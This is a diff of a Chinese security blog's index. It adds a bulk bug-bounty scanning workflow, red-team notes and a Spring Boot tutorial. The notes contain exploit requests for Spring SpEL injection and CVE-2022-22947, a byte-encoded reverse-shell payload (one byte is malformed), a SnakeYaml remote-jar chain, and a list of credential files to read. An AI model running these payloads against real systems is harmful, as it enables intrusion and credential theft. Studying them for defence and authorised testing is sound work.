@@ -253,119 +253,47 @@
 
 
 ]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
       <tags>
-        <tag>APP 移动安全 安卓安全测试</tag>
+        <tag>Android</tag>
+        <tag>APK</tag>
+        <tag>Drozer</tag>
       </tags>
   </entry>
   <entry>
-    <title>红队常用工具</title>
-    <url>/RedTeamTools.html</url>
+    <title>SRC挖掘</title>
+    <url>/SRC%E6%8C%96%E6%8E%98.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
 
-<h2 id="Vulnerability-Scan"><a href="#Vulnerability-Scan" class="headerlink" title="Vulnerability Scan"></a>Vulnerability Scan</h2><table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>nuclei</td>
-<td>基于yaml格式的POC漏扫工具（命令行形式）</td>
-</tr>
-<tr>
-<td>nuclei-web</td>
-<td>少欣自研的基于nuclei+fofa的漏扫平台</td>
-</tr>
-<tr>
-<td>AWVS</td>
-<td>国外的漏扫平台，建议在闲鱼上购买当年最新的版本</td>
-</tr>
-</tbody></table>
-<h2 id="Package-Sniffing"><a href="#Package-Sniffing" class="headerlink" title="Package Sniffing"></a>Package Sniffing</h2><table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>BurpSuite</td>
-<td>经典HTTP&#x2F;s抓包工具，插件生态丰富</td>
-</tr>
-<tr>
-<td>Wireshark</td>
-<td>抓去整个网卡流量的老牌工具</td>
-</tr>
-<tr>
-<td>Proxifier</td>
-<td>代理指定进程的所有流量</td>
-</tr>
-<tr>
-<td>Yakit</td>
-<td>国产http&#x2F;s抓包工具，新起之秀，等几年插件生态丰富了再用</td>
-</tr>
-<tr>
-<td>captcha-killer</td>
-<td>BurpSuite插件：爆破登录框时，自动识别验证码</td>
-</tr>
-<tr>
-<td>HaE</td>
-<td>根据正则表达式在请求或者响应中匹配关键字，然后高亮显示，检测信息泄露非常好用</td>
-</tr>
-</tbody></table>
-<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>010Editor</td>
-<td>16进制查看工具</td>
-</tr>
-<tr>
-<td>jadx-gui</td>
-<td>apk&#x2F;jar静态分析、反编译工具</td>
-</tr>
-</tbody></table>
-<h2 id="All-in"><a href="#All-in" class="headerlink" title="All-in"></a>All-in</h2><table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Tscan</td>
-<td>聚合了端口扫描、poc扫描、红队常用小工具的GUI程序，基于JAVA实现跨平台</td>
-</tr>
-</tbody></table>
-<h2 id="ObtainInfo"><a href="#ObtainInfo" class="headerlink" title="ObtainInfo"></a>ObtainInfo</h2><table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>observer_ward</td>
-<td>Web finger scanner</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
+<h2 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘"></a>资产测绘</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url: fofa.icu  fofa.info</span><br><span class="line">query: country=&quot;CN&quot; &amp;&amp; (host=&quot;.com&quot; || host=&quot;.cn&quot;) &amp;&amp; </span><br></pre></td></tr></table></figure>
+
+<h2 id="企业背调"><a href="#企业背调" class="headerlink" title="企业背调"></a>企业背调</h2><ol>
+<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
+<li>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></li>
+<li>SEO权重：<a href="https://github.com/Potato-py/ipInfoSearch">https://github.com/Potato-py/ipInfoSearch</a></li>
+</ol>
+<h2 id="SRC平台"><a href="#SRC平台" class="headerlink" title="SRC平台"></a>SRC平台</h2><ol>
+<li>权重为0：漏洞盒子-公益SRC</li>
+<li>有权重：补天</li>
+<li>edu.cn：教育SRC</li>
+<li>大厂：专属SRC</li>
+</ol>
+<h2 id="快速出洞"><a href="#快速出洞" class="headerlink" title="快速出洞"></a>快速出洞</h2><h3 id="通过Nday找目标"><a href="#通过Nday找目标" class="headerlink" title="通过Nday找目标"></a>通过Nday找目标</h3><p>在nuclei poc的收集平台上<a href="https://github.com/adysec/nuclei_poc%E4%BB%A5%E6%97%B6%E9%97%B4%E9%A1%BA%E5%BA%8F%E5%80%92%E6%8E%A8%E6%89%BE%E6%9C%80%E6%96%B0%E7%9A%84poc">https://github.com/adysec/nuclei_poc以时间顺序倒推找最新的poc</a>  &#x3D;&#x3D;&gt;  然后通过FOFA匹配资产  &#x3D;&#x3D;&gt;  VPS批量漏洞+云端上传  &#x3D;&#x3D;&gt;  导出结果+ipinfoSearch批量查权重  &#x3D;&#x3D;&gt;  企查查&#x2F;爱企查做背调  &#x3D;&#x3D;&gt;  有权重交补天，没权重交盒子  &#x3D;&#x3D;&gt;  如果提示漏洞标题存在，加上一些特殊符号进行绕过。</p>
+<ol>
+<li>URL格式处理：<a href="http://tools.sbbbb.cn/url-ip/">URL &amp; IP 在线处理工具</a></li>
+</ol>
 ]]></content>
+      <categories>
+        <category>SRC</category>
+      </categories>
+      <tags>
+        <tag>SRC挖掘思路</tag>
+      </tags>
   </entry>
   <entry>
-    <title>RedteamNotes</title>
+    <title>红队笔记</title>
     <url>/RedteamNotes.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
 
@@ -465,8 +393,58 @@
   <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">0. 方向：找账号密码、程序源码/二进制（逆向找key、找密码）</span><br><span class="line">1. 历史命令（如mysql -uroot -proot）：/root/.bash_history、/home/username/.bash_history</span><br><span class="line">2. SSH公钥：/root/.ssh/id_rsa、/root/.ssh/authorized_keys</span><br><span class="line">3. 系统信息：/etc/redhat-release</span><br><span class="line">4. 本地文件的配置信息：var/lib/mlocate/mlocate.db</span><br><span class="line">5. 当前用户：/proc/self/loginuid</span><br><span class="line">6. 环境变量：/proc/self/environ</span><br><span class="line">7. 内网ip：/proc/net/fib_trie</span><br><span class="line">8. 当前进程对应的PID：/proc/sched_debug</span><br></pre></td></tr></table></figure></li>
 </ul>
 </li>
-<li><p>actuator下的敏感接口未授权访问，导致泄露敏感信息</p>
+<li><p>actuator是SB中专门用来监控java运行环境的板块，里面的工具类包括但不限于读取内存信息、环境配置信息、重启接口等等，这些高危的接口经常出现口未授权访问，导致泄露敏感信息，为进一步的利用提供了非常重要的情报。下面是actuator中一些高敏的接口，以及访问到这些接口之后如何利用泄露的信息（这些接口在SB1版本中，没有归类到actuator路径下面）。</p>
 <p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110145553277.png" alt="image-20251110145553277"></p>
+</li>
+<li><p>ErrorPage页面SpEL表达式注入(SB1版本)</p>
+<ul>
+<li><p>爆破&#x2F;寻找引发ErrorPage的接口以及参数，例如&#x2F;article?id&#x3D;，需要注意ErrorPage中的status的值应为500</p>
+<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111134757585.png" alt="image-20251111134757585"></p>
+</li>
+<li><p>注入SpEL表达式，执行RCE反弹shell</p>
+  <figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x7b,0x65,0x63,0x68,0x6f,0x2c,0x59,0x6d,0x46,0x7a,0x61,0x43,0x41,0x74,0x61,0x53,0x41,0x2b,0x4a,0x69,0x41,0x76,0x5a,0x47,0x56,0x32,0x4c,0x33,0x52,0x6a,0x63,0x43,0x32d,0x64,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x68,0x2c,0x2d,0x69,0x7d&#125;))&#125;</span><br><span class="line"> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>SnakeYaml RCE（Spring-Cloud-Btoot-Stater≤1.3）</p>
+<ul>
+<li><p>利用链</p>
+  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">请求/env接口（env接口存在未授权访问） ==&gt; 设置SpringCloud配置文件为一个恶意的配置文件 ==&gt; 该配置配置文件指向一个恶意的jar包 ==&gt; 发送请求给后端 ==&gt; 后端根据配置文件的内容，下载并运行jar包（目标机器可以出网） ==&gt; 请求/refresh接口，刷新所有接口的缓存 ==&gt; 成功上线</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置文件</p>
+<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111140514689.png" alt="image-20251111140514689"></p>
+</li>
+<li><p>exp.jar：<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="JAVA-JDBC"><a href="#JAVA-JDBC" class="headerlink" title="JAVA-JDBC"></a>JAVA-JDBC</h4><ol>
+<li>反序列化</li>
+</ol>
+<h4 id="JAVA-SpringCloudGateway"><a href="#JAVA-SpringCloudGateway" class="headerlink" title="JAVA-SpringCloudGateway"></a>JAVA-SpringCloudGateway</h4><ol>
+<li><p>SpringCloudGateway（以下简称SCG）</p>
+ <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. SCG用来路由api地址，处理api请求以及响应（Browser &lt;==&gt; SCG &lt;==&gt; api），在3.1.0及以前的版本中存在SpEL表达式注入漏洞，也就是说如果api的请求或者响应中存在SpEL表达式，那么SCG代码会解析并且执行表达式，从而造成了代码执行；</span><br><span class="line">2. SB添加SCG之后，通过/actuator/gateway对SCG进行控制，加上上面的漏洞，从而实现完整的远程代码执行漏洞CVE-2022-22947（Hacker &lt;==&gt; SB-actuator/gateway &lt;==&gt; SCG &lt;==&gt; OS）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>actuator操控SCG</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111112050167.png" alt="image-20251111112050167"></p>
+</li>
+<li><p>可通过actuator&#x2F;mapping尝试判断SB中有没有启用SCG，并尝试SCG是否有权限可以访问&#x2F;actuator&#x2F;gateway接口</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131440359.png" alt="image-20251111131440359"></p>
+</li>
+<li><p>向SCG中注册一个包含SpEL表达式的路由</p>
+ <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript"></span></span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131937318.png" alt="image-20251111131937318"></p>
+</li>
+<li><p>刷新SCG缓存</p>
+ <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript"></span></span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131741403.png" alt="image-20251111131741403"></p>
+</li>
+<li><p>访问注册的路由</p>
+ <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131826279.png" alt="image-20251111131826279"></p>
 </li>
 </ol>
 <h4 id="JAVA-Jolokia"><a href="#JAVA-Jolokia" class="headerlink" title="JAVA-Jolokia"></a>JAVA-Jolokia</h4><ol>
@@ -518,7 +496,7 @@
 </li>
 <li><p>OpenApi规范最开始叫做swagger，从2.0版本（2014年）开始正式更名为OpenApi。如上面所讲，不同框架都有自己实现OpenApi规范的小组件，但基本上都默认采用OpenApi官方给出的页面作为测试界面，所以可以通过fofa批量查找这个页面：title&#x3D;”Swagger UI”</p>
 </li>
-<li><p>如果已经未授权访问到了swagger ui界面，那么可以批量测试其中的api：接口文档地址（一般在swagger ui界面上会有提示，改地址以纯文本的形式返回所有的api接口）&#x3D;&#x3D;&gt; postman&#x2F;apifox &#x3D;&#x3D;&gt; BurpSuite &#x3D;&#x3D;&gt; Xray。</p>
+<li><p>如果已经未授权访问到了swagger ui界面，那么可以批量测试其中的api，因为这是一个通用的规范，所以不管你的后端是java还是golang或者其他语言，只要按照这个标准实现了SwaggerUI中的功能，且泄露了这个页面，就会成为其他漏洞挖掘&amp;利用的一个起点：接口文档地址（一般在swagger ui界面上会有提示，改地址以纯文本的形式返回所有的api接口）&#x3D;&#x3D;&gt; postman&#x2F;apifox &#x3D;&#x3D;&gt; BurpSuite &#x3D;&#x3D;&gt; Xray。</p>
 </li>
 </ol>
 <h3 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h3><h2 id="Webshell免杀"><a href="#Webshell免杀" class="headerlink" title="Webshell免杀"></a>Webshell免杀</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ol>
@@ -560,12 +538,268 @@
         <category>红队</category>
       </categories>
       <tags>
-        <tag>web打点</tag>
-        <tag>内网渗透</tag>
+        <tag>APT</tag>
+        <tag>红队</tag>
+        <tag>渗透</tag>
+        <tag>web</tag>
+        <tag>内网</tag>
       </tags>
   </entry>
   <entry>
-    <title>红对面试八股文</title>
+    <title>SpringBoot入门</title>
+    <url>/SpringBootDev.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
+
+<h1 id="快速启动"><a href="#快速启动" class="headerlink" title="快速启动"></a>快速启动</h1><h2 id="产品背景"><a href="#产品背景" class="headerlink" title="产品背景"></a>产品背景</h2><ol>
+<li><p>Spring生态众多，不止一两个框架而已，下图是一些Spring生态中比较出名的框架。可以看到从数据库、web、cloud到Android、LDAP等等，很多方向都有框架。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110231515495.png" alt="image-20251110231515495"></p>
+</li>
+<li><p>SpringFramework（以下简称SF）是Spring生态中最重要的一环、是最根本的基石，简单理解Spring中其他框架都来自于SF，所以也有很多人把SF简称为Spring，就像把DBMS简称为数据库是一样的道理。SpringBoot（以下简称SB）是基于SF，在web方向开发出来的一款框架（其实SF中的SpringMVC本就可以开发web，以前的“SSM”三件套，只是SB更加专业，逐渐代替了SSM）。SB对于开发者而言方便很多，现在Java后端几乎都采用SB进行开发，而且如下图所示，SB还可以和其他的一些工具&#x2F;框架相结合，使得web框架可定制化程度更高，更加受到开发者的青睐。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
+</li>
+<li><p>SB与SF的对应关系</p>
+<table>
+<thead>
+<tr>
+<th align="center">Spring Boot 版本</th>
+<th align="center">对应的 Spring Framework 版本范围</th>
+<th align="center">发布时间</th>
+<th align="center">支持状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">3.3.x</td>
+<td align="center">6.2.x</td>
+<td align="center">2024 年</td>
+<td align="center">最新版本，持续更新</td>
+</tr>
+<tr>
+<td align="center">3.2.x</td>
+<td align="center">6.1.x</td>
+<td align="center">2023 年底</td>
+<td align="center">活跃支持中（OSS 支持至 2025 年）</td>
+</tr>
+<tr>
+<td align="center">3.1.x</td>
+<td align="center">6.0.x</td>
+<td align="center">2023 年</td>
+<td align="center">已停止 OSS 支持，商业支持中</td>
+</tr>
+<tr>
+<td align="center">3.0.x</td>
+<td align="center">6.0.x（早期版本）</td>
+<td align="center">2022 年底</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.7.x（LTS）</td>
+<td align="center">5.3.x</td>
+<td align="center">2021 年</td>
+<td align="center">长期支持（至 2025 年 11 月）</td>
+</tr>
+<tr>
+<td align="center">2.6.x</td>
+<td align="center">5.3.x</td>
+<td align="center">2021 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.5.x</td>
+<td align="center">5.3.x</td>
+<td align="center">2021 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.4.x</td>
+<td align="center">5.3.x</td>
+<td align="center">2020 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.3.x</td>
+<td align="center">5.2.x</td>
+<td align="center">2020 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.2.x</td>
+<td align="center">5.2.x</td>
+<td align="center">2019 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.1.x（LTS）</td>
+<td align="center">5.1.x</td>
+<td align="center">2018 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.0.x</td>
+<td align="center">5.0.x</td>
+<td align="center">2018 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">1.5.x（LTS）</td>
+<td align="center">4.3.x</td>
+<td align="center">2017 年</td>
+<td align="center">已停止支持</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><ol>
+<li><p>通过SpringBoot（以下简称SB）插件快速创建SB项目</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224213490.png" alt="image-20251110224213490"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
+</li>
+<li><p>项目结构</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224556678.png" alt="image-20251110224556678"></p>
+</li>
+<li><p>关键代码展示（IOC&#x2F;DI）</p>
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过<span class="doctag">@Component</span>注解，将这个类注册为SB的一个组件，交给SB框架进行管理****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl1</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过<span class="doctag">@Component</span>注解，将这个类注册为SB的一个组件，交给SB框架进行管理****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl2</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span>  <span class="comment">//注册为SB的一个组件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line">    <span class="meta">@Qualifier(&quot;userDaoImpl2&quot;)</span>  <span class="comment">//如果有多个类型相同的组件，需要根据具体的类，指定要关联哪一个组件</span></span><br><span class="line">    <span class="meta">@Autowired</span>  <span class="comment">//自动关联类为UserDao的组件</span></span><br><span class="line">    UserDao userDao;  <span class="comment">//这三行代码相当于：UserDao userDao = new userDaoImpl2();</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(userDao.getUser());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过注解，告诉SB这是一个配置类****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;top.shaoxinsec.springstudy&quot;)</span>  <span class="comment">//告诉SB，要管理哪个包下面的组件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaConfig</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>单元测试</p>
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.config.JavaConfig;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserService;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span>  <span class="comment">//如果报错，在pom.xml中添加junit依赖</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span 